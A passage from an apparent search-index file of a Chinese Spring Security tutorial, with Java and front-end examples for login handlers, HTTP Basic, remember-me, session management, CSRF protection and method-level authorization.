// \u767b\u5f55\u6210\u529f\u540e\u7684\u9ed8\u8ba4\u8df3\u8f6cURL\n                .defaultSuccessUrl(\"/dashboard\", true)\n\n                // \u767b\u5f55\u5931\u8d25URL\n                .failureUrl(\"/login?error=true\")\n\n                // \u8868\u5355\u53c2\u6570\u540d\n                .usernameParameter(\"username\")\n                .passwordParameter(\"password\")\n\n                // \u5141\u8bb8\u6240\u6709\u4eba\u8bbf\u95ee\u767b\u5f55\u9875\n                .permitAll()\n            );\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_8","title":"\u81ea\u5b9a\u4e49\u767b\u5f55\u6210\u529f\u5904\u7406\u5668","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49\u767b\u5f55\u6210\u529f\u5904\u7406\u5668\n */\n@Component\npublic class CustomAuthenticationSuccessHandler implements AuthenticationSuccessHandler {\n\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    @Autowired\n    private JwtTokenProvider tokenProvider;\n\n    @Autowired\n    private LoginHistoryService loginHistoryService;\n\n    @Override\n    public void onAuthenticationSuccess(HttpServletRequest request,\n                                       HttpServletResponse response,\n                                       Authentication authentication) \n            throws IOException {\n\n        // 1. \u8bb0\u5f55\u767b\u5f55\u5386\u53f2\n        String username = authentication.getName();\n        String ipAddress = getClientIP(request);\n        loginHistoryService.recordLogin(username, ipAddress, true);\n\n        // 2. \u6839\u636e\u8bf7\u6c42\u7c7b\u578b\u8fd4\u56de\u4e0d\u540c\u54cd\u5e94\n        if (isAjaxRequest(request)) {\n            // AJAX\u8bf7\u6c42\uff1a\u8fd4\u56deJSON\n            handleAjaxResponse(response, authentication);\n        } else {\n            // \u666e\u901a\u8bf7\u6c42\uff1a\u91cd\u5b9a\u5411\n            handleRedirect(request, response, authentication);\n        }\n    }\n\n    private void handleAjaxResponse(HttpServletResponse response, \n                                    Authentication authentication) throws IOException {\n        response.setContentType(\"application/json;charset=UTF-8\");\n\n        // \u751f\u6210Token\uff08\u7528\u4e8e\u524d\u540e\u7aef\u5206\u79bb\u573a\u666f\uff09\n        String token = tokenProvider.createToken(authentication);\n\n        Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();\n        result.put(\"success\", true);\n        result.put(\"message\", \"\u767b\u5f55\u6210\u529f\");\n        result.put(\"token\", token);\n        result.put(\"username\", authentication.getName());\n        result.put(\"authorities\", authentication.getAuthorities());\n\n        response.getWriter().write(objectMapper.writeValueAsString(result));\n    }\n\n    private void handleRedirect(HttpServletRequest request,\n                               HttpServletResponse response,\n                               Authentication authentication) throws IOException {\n\n        // \u6839\u636e\u89d2\u8272\u91cd\u5b9a\u5411\u5230\u4e0d\u540c\u9875\u9762\n        Collection&lt;? extends GrantedAuthority&gt; authorities = authentication.getAuthorities();\n\n        String targetUrl = \"/dashboard\";\n        for (GrantedAuthority authority : authorities) {\n            if (authority.getAuthority().equals(\"ROLE_ADMIN\")) {\n                targetUrl = \"/admin/dashboard\";\n                break;\n            } else if (authority.getAuthority().equals(\"ROLE_USER\")) {\n                targetUrl = \"/user/dashboard\";\n            }\n        }\n\n        // \u5982\u679c\u6709\u4fdd\u5b58\u7684\u8bf7\u6c42\uff0c\u91cd\u5b9a\u5411\u5230\u539f\u8bf7\u6c42\n        SavedRequest savedRequest = new HttpSessionRequestCache()\n            .getRequest(request, response);\n        if (savedRequest != null) {\n            targetUrl = savedRequest.getRedirectUrl();\n        }\n\n        new DefaultRedirectStrategy().sendRedirect(request, response, targetUrl);\n    }\n\n    private boolean isAjaxRequest(HttpServletRequest request) {\n        String ajaxHeader = request.getHeader(\"X-Requested-With\");\n        return \"XMLHttpRequest\".equals(ajaxHeader);\n    }\n\n    private String getClientIP(HttpServletRequest request) {\n        String ip = request.getHeader(\"X-Forwarded-For\");\n        if (ip == null || ip.isEmpty() || \"unknown\".equalsIgnoreCase(ip)) {\n            ip = request.getHeader(\"X-Real-IP\");\n        }\n        if (ip == null || ip.isEmpty() || \"unknown\".equalsIgnoreCase(ip)) {\n            ip = request.getRemoteAddr();\n        }\n        return ip;\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_9","title":"\u81ea\u5b9a\u4e49\u767b\u5f55\u5931\u8d25\u5904\u7406\u5668","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49\u767b\u5f55\u5931\u8d25\u5904\u7406\u5668\n */\n@Component\npublic class CustomAuthenticationFailureHandler implements AuthenticationFailureHandler {\n\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    @Autowired\n    private LoginHistoryService loginHistoryService;\n\n    @Autowired\n    private LoginAttemptService loginAttemptService;\n\n    @Override\n    public void onAuthenticationFailure(HttpServletRequest request,\n                                       HttpServletResponse response,\n                                       AuthenticationException exception) \n            throws IOException {\n\n        String username = request.getParameter(\"username\");\n        String ipAddress = getClientIP(request);\n\n        // 1. \u8bb0\u5f55\u5931\u8d25\u6b21\u6570\n        loginAttemptService.loginFailed(username);\n        loginHistoryService.recordLogin(username, ipAddress, false);\n\n        // 2. \u751f\u6210\u9519\u8bef\u6d88\u606f\n        String errorMessage = getErrorMessage(exception);\n\n        // 3. \u6839\u636e\u8bf7\u6c42\u7c7b\u578b\u8fd4\u56de\u4e0d\u540c\u54cd\u5e94\n        if (isAjaxRequest(request)) {\n            handleAjaxResponse(response, errorMessage);\n        } else {\n            handleRedirect(request, response, errorMessage);\n        }\n    }\n\n    private String getErrorMessage(AuthenticationException exception) {\n        if (exception instanceof BadCredentialsException) {\n            return \"\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\";\n        } else if (exception instanceof DisabledException) {\n            return \"\u8d26\u6237\u5df2\u88ab\u7981\u7528\";\n        } else if (exception instanceof LockedException) {\n            return \"\u8d26\u6237\u5df2\u88ab\u9501\u5b9a\";\n        } else if (exception instanceof AccountExpiredException) {\n            return \"\u8d26\u6237\u5df2\u8fc7\u671f\";\n        } else if (exception instanceof CredentialsExpiredException) {\n            return \"\u5bc6\u7801\u5df2\u8fc7\u671f\";\n        } else {\n            return \"\u767b\u5f55\u5931\u8d25\uff1a\" + exception.getMessage();\n        }\n    }\n\n    private void handleAjaxResponse(HttpServletResponse response, String errorMessage) \n            throws IOException {\n        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n        response.setContentType(\"application/json;charset=UTF-8\");\n\n        Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();\n        result.put(\"success\", false);\n        result.put(\"message\", errorMessage);\n\n        response.getWriter().write(objectMapper.writeValueAsString(result));\n    }\n\n    private void handleRedirect(HttpServletRequest request,\n                               HttpServletResponse response,\n                               String errorMessage) throws IOException {\n        String redirectUrl = \"/login?error=true&amp;message=\" + \n            URLEncoder.encode(errorMessage, StandardCharsets.UTF_8);\n        new DefaultRedirectStrategy().sendRedirect(request, response, redirectUrl);\n    }\n\n    private boolean isAjaxRequest(HttpServletRequest request) {\n        return \"XMLHttpRequest\".equals(request.getHeader(\"X-Requested-With\"));\n    }\n\n    private String getClientIP(HttpServletRequest request) {\n        String ip = request.getHeader(\"X-Forwarded-For\");\n        if (ip == null || ip.isEmpty()) {\n            ip = request.getRemoteAddr();\n        }\n        return ip;\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#html","title":"\u767b\u5f55\u9875\u9762HTML","text":"<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html xmlns:th=\"http://www.thymeleaf.org\"&gt;\n&lt;head&gt;\n    &lt;title&gt;\u767b\u5f55&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"/css/login.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"login-container\"&gt;\n        &lt;h2&gt;\u7528\u6237\u767b\u5f55&lt;/h2&gt;\n\n        &lt;!-- \u9519\u8bef\u6d88\u606f --&gt;\n        &lt;div th:if=\"${param.error}\" class=\"alert alert-danger\"&gt;\n            &lt;span th:text=\"${param.message} ?: '\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef'\"&gt;&lt;/span&gt;\n        &lt;/div&gt;\n\n        &lt;!-- \u767b\u51fa\u6d88\u606f --&gt;\n        &lt;div th:if=\"${param.logout}\" class=\"alert alert-success\"&gt;\n            \u60a8\u5df2\u6210\u529f\u767b\u51fa\n        &lt;/div&gt;\n\n        &lt;!-- \u767b\u5f55\u8868\u5355 --&gt;\n        &lt;form th:action=\"@{/perform_login}\" method=\"post\"&gt;\n            &lt;div class=\"form-group\"&gt;\n                &lt;label for=\"username\"&gt;\u7528\u6237\u540d:&lt;/label&gt;\n                &lt;input type=\"text\" id=\"username\" name=\"username\" \n                       required autofocus class=\"form-control\"&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"form-group\"&gt;\n                &lt;label for=\"password\"&gt;\u5bc6\u7801:&lt;/label&gt;\n                &lt;input type=\"password\" id=\"password\" name=\"password\" \n                       required class=\"form-control\"&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"form-group\"&gt;\n                &lt;label&gt;\n                    &lt;input type=\"checkbox\" name=\"remember-me\"&gt; \u8bb0\u4f4f\u6211\n                &lt;/label&gt;\n            &lt;/div&gt;\n\n            &lt;!-- CSRF Token --&gt;\n            &lt;input type=\"hidden\" th:name=\"${_csrf.parameterName}\" \n                   th:value=\"${_csrf.token}\"&gt;\n\n            &lt;button type=\"submit\" class=\"btn btn-primary\"&gt;\u767b\u5f55&lt;/button&gt;\n        &lt;/form&gt;\n\n        &lt;div class=\"links\"&gt;\n            &lt;a href=\"/register\"&gt;\u6ce8\u518c\u65b0\u8d26\u53f7&lt;/a&gt; |\n            &lt;a href=\"/forgot-password\"&gt;\u5fd8\u8bb0\u5bc6\u7801&lt;/a&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#http-basic","title":"HTTP Basic\u8ba4\u8bc1","text":""},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_10","title":"\u57fa\u7840\u914d\u7f6e","text":"<pre><code>@Configuration\n@EnableWebSecurity\npublic class BasicAuthConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/api/**\").authenticated()\n                .anyRequest().permitAll()\n            )\n            .httpBasic(Customizer.withDefaults())\n            .csrf().disable();  // Basic\u8ba4\u8bc1\u901a\u5e38\u7981\u7528CSRF\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#basic","title":"\u81ea\u5b9a\u4e49Basic\u8ba4\u8bc1\u5165\u53e3\u70b9","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49Basic\u8ba4\u8bc1\u5165\u53e3\u70b9\n */\n@Component\npublic class CustomBasicAuthenticationEntryPoint implements AuthenticationEntryPoint {\n\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    @Override\n    public void commence(HttpServletRequest request,\n                        HttpServletResponse response,\n                        AuthenticationException authException) \n            throws IOException {\n\n        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n        response.setHeader(\"WWW-Authenticate\", \"Basic realm=\\\"API\\\"\");\n        response.setContentType(\"application/json;charset=UTF-8\");\n\n        Map&lt;String, Object&gt; error = new HashMap&lt;&gt;();\n        error.put(\"status\", 401);\n        error.put(\"error\", \"Unauthorized\");\n        error.put(\"message\", \"\u9700\u8981\u8ba4\u8bc1\u624d\u80fd\u8bbf\u95ee\u6b64\u8d44\u6e90\");\n        error.put(\"path\", request.getRequestURI());\n\n        response.getWriter().write(objectMapper.writeValueAsString(error));\n    }\n}\n\n/**\n * \u914d\u7f6e\u81ea\u5b9a\u4e49\u5165\u53e3\u70b9\n */\n@Configuration\npublic class BasicAuthConfig {\n\n    @Autowired\n    private CustomBasicAuthenticationEntryPoint authenticationEntryPoint;\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .anyRequest().authenticated()\n            )\n            .httpBasic(basic -&gt; basic\n                .authenticationEntryPoint(authenticationEntryPoint)\n            );\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#basic_1","title":"Basic\u8ba4\u8bc1\u5ba2\u6237\u7aef\u793a\u4f8b","text":"<pre><code>/**\n * \u4f7f\u7528RestTemplate\u8c03\u7528Basic\u8ba4\u8bc1\u4fdd\u62a4\u7684API\n */\n@Service\npublic class ApiClient {\n\n    public String callProtectedApi() {\n        String url = \"https://api.example.com/data\";\n        String username = \"user\";\n        String password = \"password\";\n\n        // \u65b9\u5f0f1: \u4f7f\u7528HttpHeaders\n        HttpHeaders headers = new HttpHeaders();\n        String auth = username + \":\" + password;\n        byte[] encodedAuth = Base64.getEncoder().encode(auth.getBytes(StandardCharsets.UTF_8));\n        String authHeader = \"Basic \" + new String(encodedAuth);\n        headers.set(\"Authorization\", authHeader);\n\n        HttpEntity&lt;String&gt; entity = new HttpEntity&lt;&gt;(headers);\n        RestTemplate restTemplate = new RestTemplate();\n        ResponseEntity&lt;String&gt; response = restTemplate.exchange(\n            url, HttpMethod.GET, entity, String.class\n        );\n\n        return response.getBody();\n    }\n\n    public String callProtectedApiV2() {\n        // \u65b9\u5f0f2: \u4f7f\u7528RestTemplate with BasicAuthenticationInterceptor\n        RestTemplate restTemplate = new RestTemplate();\n        restTemplate.getInterceptors().add(\n            new BasicAuthenticationInterceptor(\"user\", \"password\")\n        );\n\n        return restTemplate.getForObject(\"https://api.example.com/data\", String.class);\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#remember-me","title":"Remember-Me\u529f\u80fd","text":""},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#tokenremember-me","title":"\u57fa\u4e8eToken\u7684Remember-Me","text":"<pre><code>@Configuration\npublic class RememberMeConfig {\n\n    @Autowired\n    private UserDetailsService userDetailsService;\n\n    @Autowired\n    private DataSource dataSource;\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .rememberMe(remember -&gt; remember\n                // Token\u6709\u6548\u671f\uff08\u79d2\uff09\n                .tokenValiditySeconds(86400 * 7)  // 7\u5929\n\n                // Remember-Me\u53c2\u6570\u540d\n                .rememberMeParameter(\"remember-me\")\n\n                // Remember-Me Cookie\u540d\n                .rememberMeCookieName(\"remember-me\")\n\n                // Cookie\u57df\n                .rememberMeCookieDomain(\"example.com\")\n\n                // \u5bc6\u94a5\uff08\u7528\u4e8e\u751f\u6210Token\u7b7e\u540d\uff09\n                .key(\"uniqueAndSecretKey\")\n\n                // UserDetailsService\n                .userDetailsService(userDetailsService)\n\n                // \u4f7f\u7528\u5b89\u5168Cookie\n                .useSecureCookie(true)\n\n                // Token\u6301\u4e45\u5316\u4ed3\u5e93\n                .tokenRepository(persistentTokenRepository())\n            );\n\n        return http.build();\n    }\n\n    /**\n     * \u6301\u4e45\u5316Token\u4ed3\u5e93\uff08\u63a8\u8350\uff09\n     */\n    @Bean\n    public PersistentTokenRepository persistentTokenRepository() {\n        JdbcTokenRepositoryImpl tokenRepository = new JdbcTokenRepositoryImpl();\n        tokenRepository.setDataSource(dataSource);\n        // \u9996\u6b21\u8fd0\u884c\u65f6\u521b\u5efa\u8868\uff08\u751f\u4ea7\u73af\u5883\u5e94\u624b\u52a8\u521b\u5efa\uff09\n        // tokenRepository.setCreateTableOnStartup(true);\n        return tokenRepository;\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#remember-me_1","title":"\u81ea\u5b9a\u4e49Remember-Me\u670d\u52a1","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49Remember-Me\u670d\u52a1\n */\n@Component\npublic class CustomRememberMeServices extends PersistentTokenBasedRememberMeServices {\n\n    @Autowired\n    private UserActivityService userActivityService;\n\n    public CustomRememberMeServices(String key, \n                                   UserDetailsService userDetailsService,\n                                   PersistentTokenRepository tokenRepository) {\n        super(key, userDetailsService, tokenRepository);\n    }\n\n    @Override\n    protected void onLoginSuccess(HttpServletRequest request,\n                                  HttpServletResponse response,\n                                  Authentication successfulAuthentication) {\n\n        String username = successfulAuthentication.getName();\n        String ipAddress = request.getRemoteAddr();\n\n        // \u8bb0\u5f55\u7528\u6237\u6d3b\u52a8\n        userActivityService.recordRememberMeLogin(username, ipAddress);\n\n        super.onLoginSuccess(request, response, successfulAuthentication);\n    }\n\n    @Override\n    protected UserDetails processAutoLoginCookie(String[] cookieTokens,\n                                                HttpServletRequest request,\n                                                HttpServletResponse response) {\n\n        // \u53ef\u4ee5\u6dfb\u52a0\u989d\u5916\u7684\u9a8c\u8bc1\u903b\u8f91\n        String ipAddress = request.getRemoteAddr();\n\n        // \u68c0\u67e5IP\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d\n        if (isBlacklistedIP(ipAddress)) {\n            throw new RememberMeAuthenticationException(\"IP\u5730\u5740\u88ab\u7981\u6b62\");\n        }\n\n        return super.processAutoLoginCookie(cookieTokens, request, response);\n    }\n\n    private boolean isBlacklistedIP(String ipAddress) {\n        // \u5b9e\u73b0IP\u9ed1\u540d\u5355\u68c0\u67e5\u903b\u8f91\n        return false;\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_11","title":"\u4f1a\u8bdd\u7ba1\u7406\u7b56\u7565","text":""},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_12","title":"\u4f1a\u8bdd\u5e76\u53d1\u63a7\u5236","text":"<pre><code>@Configuration\npublic class SessionManagementConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .sessionManagement(session -&gt; session\n                // \u4f1a\u8bdd\u521b\u5efa\u7b56\u7565\n                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)\n\n                // \u65e0\u6548\u4f1a\u8bddURL\n                .invalidSessionUrl(\"/login?invalid\")\n\n                // \u4f1a\u8bdd\u56fa\u5b9a\u653b\u51fb\u9632\u62a4\n                .sessionFixation().migrateSession()\n\n                // \u5e76\u53d1\u4f1a\u8bdd\u63a7\u5236\n                .maximumSessions(1)  // \u540c\u4e00\u7528\u6237\u6700\u591a1\u4e2a\u4f1a\u8bdd\n                    .maxSessionsPreventsLogin(false)  // false: \u8e22\u6389\u65e7\u4f1a\u8bdd; true: \u62d2\u7edd\u65b0\u767b\u5f55\n                    .expiredUrl(\"/login?expired\")\n                    .sessionRegistry(sessionRegistry())\n            );\n\n        return http.build();\n    }\n\n    @Bean\n    public SessionRegistry sessionRegistry() {\n        return new SessionRegistryImpl();\n    }\n\n    @Bean\n    public HttpSessionEventPublisher httpSessionEventPublisher() {\n        return new HttpSessionEventPublisher();\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_13","title":"\u4f1a\u8bdd\u8d85\u65f6\u914d\u7f6e","text":"<pre><code># application.properties\n\n# \u4f1a\u8bdd\u8d85\u65f6\u65f6\u95f4\uff0830\u5206\u949f\uff09\nserver.servlet.session.timeout=30m\n\n# Session Cookie\u914d\u7f6e\nserver.servlet.session.cookie.name=JSESSIONID\nserver.servlet.session.cookie.http-only=true\nserver.servlet.session.cookie.secure=true\nserver.servlet.session.cookie.same-site=strict\nserver.servlet.session.cookie.max-age=1800\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_14","title":"\u83b7\u53d6\u5728\u7ebf\u7528\u6237\u5217\u8868","text":"<pre><code>/**\n * \u5728\u7ebf\u7528\u6237\u7ba1\u7406\n */\n@Service\npublic class OnlineUserService {\n\n    @Autowired\n    private SessionRegistry sessionRegistry;\n\n    /**\n     * \u83b7\u53d6\u6240\u6709\u5728\u7ebf\u7528\u6237\n     */\n    public List&lt;OnlineUser&gt; getAllOnlineUsers() {\n        List&lt;OnlineUser&gt; onlineUsers = new ArrayList&lt;&gt;();\n\n        List&lt;Object&gt; principals = sessionRegistry.getAllPrincipals();\n\n        for (Object principal : principals) {\n            List&lt;SessionInformation&gt; sessions = \n                sessionRegistry.getAllSessions(principal, false);\n\n            for (SessionInformation session : sessions) {\n                OnlineUser onlineUser = new OnlineUser();\n                onlineUser.setUsername(principal.toString());\n                onlineUser.setSessionId(session.getSessionId());\n                onlineUser.setLastRequest(session.getLastRequest());\n                onlineUser.setExpired(session.isExpired());\n\n                onlineUsers.add(onlineUser);\n            }\n        }\n\n        return onlineUsers;\n    }\n\n    /**\n     * \u8e22\u51fa\u7528\u6237\n     */\n    public void kickOutUser(String username) {\n        List&lt;Object&gt; principals = sessionRegistry.getAllPrincipals();\n\n        for (Object principal : principals) {\n            if (principal.toString().equals(username)) {\n                List&lt;SessionInformation&gt; sessions = \n                    sessionRegistry.getAllSessions(principal, false);\n\n                for (SessionInformation session : sessions) {\n                    session.expireNow();  // \u4f7f\u4f1a\u8bdd\u7acb\u5373\u8fc7\u671f\n                }\n                break;\n            }\n        }\n    }\n\n    /**\n     * \u83b7\u53d6\u7528\u6237\u7684\u4f1a\u8bdd\u6570\n     */\n    public int getUserSessionCount(String username) {\n        List&lt;Object&gt; principals = sessionRegistry.getAllPrincipals();\n\n        for (Object principal : principals) {\n            if (principal.toString().equals(username)) {\n                return sessionRegistry.getAllSessions(principal, false).size();\n            }\n        }\n\n        return 0;\n    }\n}\n\n/**\n * \u5728\u7ebf\u7528\u6237DTO\n */\n@Data\npublic class OnlineUser {\n    private String username;\n    private String sessionId;\n    private Date lastRequest;\n    private boolean expired;\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#csrf","title":"CSRF\u9632\u62a4\u914d\u7f6e","text":""},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#csrf_1","title":"\u57fa\u7840CSRF\u914d\u7f6e","text":"<pre><code>@Configuration\npublic class CsrfConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .csrf(csrf -&gt; csrf\n                // \u4f7f\u7528Cookie\u5b58\u50a8CSRF Token\n                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())\n\n                // \u5ffd\u7565\u67d0\u4e9b\u8def\u5f84\u7684CSRF\u4fdd\u62a4\n                .ignoringRequestMatchers(\"/api/public/**\", \"/webhooks/**\")\n\n                // \u81ea\u5b9a\u4e49Token\u8bf7\u6c42\u5934\u540d\u79f0\n                .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())\n            );\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#csrf_2","title":"\u524d\u7aef\u96c6\u6210CSRF","text":"<p>JavaScript\u793a\u4f8b\uff08\u4f7f\u7528Cookie\u4e2d\u7684Token\uff09\uff1a</p> <pre><code>// \u4eceCookie\u83b7\u53d6CSRF Token\nfunction getCsrfToken() {\n    const name = 'XSRF-TOKEN=';\n    const decodedCookie = decodeURIComponent(document.cookie);\n    const cookies = decodedCookie.split(';');\n\n    for (let cookie of cookies) {\n        cookie = cookie.trim();\n        if (cookie.indexOf(name) === 0) {\n            return cookie.substring(name.length);\n        }\n    }\n    return '';\n}\n\n// \u53d1\u9001POST\u8bf7\u6c42\u65f6\u5305\u542bCSRF Token\nfetch('/api/data', {\n    method: 'POST',\n    headers: {\n        'Content-Type': 'application/json',\n        'X-XSRF-TOKEN': getCsrfToken()  // CSRF Token\n    },\n    body: JSON.stringify(data)\n})\n.then(response =&gt; response.json())\n.then(data =&gt; console.log(data));\n</code></pre> <p>Axios\u914d\u7f6e\uff1a</p> <pre><code>// Axios\u4f1a\u81ea\u52a8\u4eceCookie\u4e2d\u8bfb\u53d6XSRF-TOKEN\u5e76\u6dfb\u52a0\u5230\u8bf7\u6c42\u5934\naxios.defaults.xsrfCookieName = 'XSRF-TOKEN';\naxios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';\n\n// \u53d1\u9001\u8bf7\u6c42\naxios.post('/api/data', data)\n    .then(response =&gt; console.log(response.data));\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#apicsrf","title":"API\u573a\u666f\u7684CSRF\u914d\u7f6e","text":"<pre><code>/**\n * \u524d\u540e\u7aef\u5206\u79bb\u573a\u666f\u7684CSRF\u914d\u7f6e\n */\n@Configuration\npublic class ApiCsrfConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .csrf(csrf -&gt; csrf\n                // \u5bf9\u4e8e\u7eafAPI\uff0c\u53ef\u4ee5\u7981\u7528CSRF\uff08\u5982\u679c\u4f7f\u7528JWT Token\uff09\n                .disable()\n            )\n\n            // \u6216\u8005\u5bf9\u7279\u5b9a\u8def\u5f84\u7981\u7528CSRF\n            .csrf(csrf -&gt; csrf\n                .ignoringRequestMatchers(\"/api/**\")\n            );\n\n        return http.build();\n    }\n}\n</code></pre> <p>\u6ce8\u610f\uff1a \u5982\u679c\u4f7f\u7528JWT Token\u8fdb\u884c\u8ba4\u8bc1\uff0c\u901a\u5e38\u53ef\u4ee5\u7981\u7528CSRF\u4fdd\u62a4\uff0c\u56e0\u4e3aToken\u4e0d\u4f1a\u81ea\u52a8\u88ab\u6d4f\u89c8\u5668\u53d1\u9001\uff08\u4e0d\u50cfCookie\uff09\u3002</p>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_15","title":"\u65b9\u6cd5\u7ea7\u5b89\u5168","text":""},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_16","title":"\u542f\u7528\u65b9\u6cd5\u5b89\u5168","text":"<pre><code>@Configuration\n@EnableMethodSecurity(\n    prePostEnabled = true,   // \u542f\u7528@PreAuthorize\u548c@PostAuthorize\n    securedEnabled = true,   // \u542f\u7528@Secured\n    jsr250Enabled = true     // \u542f\u7528@RolesAllowed\n)\npublic class MethodSecurityConfig {\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#preauthorize","title":"@PreAuthorize\u6ce8\u89e3","text":"<pre><code>/**\n * \u4f7f\u7528@PreAuthorize\u8fdb\u884c\u65b9\u6cd5\u7ea7\u6388\u6743\n */\n@Service\npublic class UserService {\n\n    /**\n     * \u53ea\u6709ADMIN\u89d2\u8272\u53ef\u4ee5\u8bbf\u95ee\n     */\n    @PreAuthorize(\"hasRole('ADMIN')\")\n    public List&lt;User&gt; getAllUsers() {\n        return userRepository.findAll();\n    }\n\n    /**\n     * \u9700\u8981\u7279\u5b9a\u6743\u9650\n     */\n    @PreAuthorize(\"hasAuthority('USER_WRITE')\")\n    public User createUser(User user) {\n        return userRepository.save(user);\n    }\n\n    /**\n     * \u591a\u4e2a\u89d2\u8272\u4e4b\u4e00\n     */\n    @PreAuthorize(\"hasAnyRole('ADMIN', 'MANAGER')\")\n    public void deleteUser(Long id) {\n        userRepository.deleteById(id);\n    }\n\n    /**\n     * \u590d\u6742\u8868\u8fbe\u5f0f\n     */\n    @PreAuthorize(\"hasRole('USER') and #user.username == authentication.name\")\n    public User updateProfile(User user) {\n        return userRepository.save(user);\n    }\n\n    /**\n     * \u7528\u6237\u53ea\u80fd\u8bbf\u95ee\u81ea\u5df1\u7684\u6570\u636e\n     */\n    @PreAuthorize(\"#userId == authentication.principal.id\")\n    public User getUserById(Long userId) {\n        return userRepository.findById(userId).orElseThrow();\n    }\n\n    /**\n     * \u81ea\u5b9a\u4e49\u6743\u9650\u68c0\u67e5\n     */\n    @PreAuthorize(\"@customSecurityService.canAccessUser(#userId)\")\n    public User getUser(Long userId) {\n        return userRepository.findById(userId).orElseThrow();\n    }\n}\n\n/**\n * \u81ea\u5b9a\u4e49\u6743\u9650\u68c0\u67e5\u670d\u52a1\n */\n@Service(\"customSecurityService\")\npublic class CustomSecurityService {\n\n    public boolean canAccessUser(Long userId) {\n        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n\n        if (authentication == null) {\n            return false;\n        }\n\n        // \u7ba1\u7406\u5458\u53ef\u4ee5\u8bbf\u95ee\u6240\u6709\u7528\u6237\n        if (authentication.getAuthorities().stream()\n                .anyMatch(auth -&gt; auth.getAuthority().equals(\"ROLE_ADMIN\"))) {\n            return true;\n        }\n\n        // \u7528\u6237\u53ea\u80fd\u8bbf\u95ee\u81ea\u5df1\n        if (authentication.getPrincipal() instanceof CustomUserDetails) {\n            CustomUserDetails userDetails = (CustomUserDetails) authentication.getPrincipal();\n            return userDetails.getId().equals(userId);\n        }\n\n        return false;\n    